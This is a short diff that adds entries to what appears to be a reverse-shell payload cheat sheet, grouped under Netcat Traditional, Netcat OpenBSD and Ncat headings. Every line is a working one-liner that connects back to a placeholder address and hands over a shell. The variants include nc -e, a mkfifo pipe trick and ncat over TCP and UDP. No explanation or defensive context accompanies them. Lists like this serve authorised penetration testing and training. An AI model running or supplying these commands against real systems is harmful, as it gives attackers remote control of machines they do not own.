@@ -1,1 +1,14 @@
+# Netcat Traditional
 nc -e /bin/sh $local_ip $port
+
+nc.traditional -e /bin/bash $local_ip $port
+
+nc -c bash $local_ip $port
+
+# Netcat OpenBSD
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $local_ip $port >/tmp/f
+
+# Ncat
+ncat $local_ip $port -e /bin/bash
+
+ncat --udp $local_ip $port -e /bin/bash
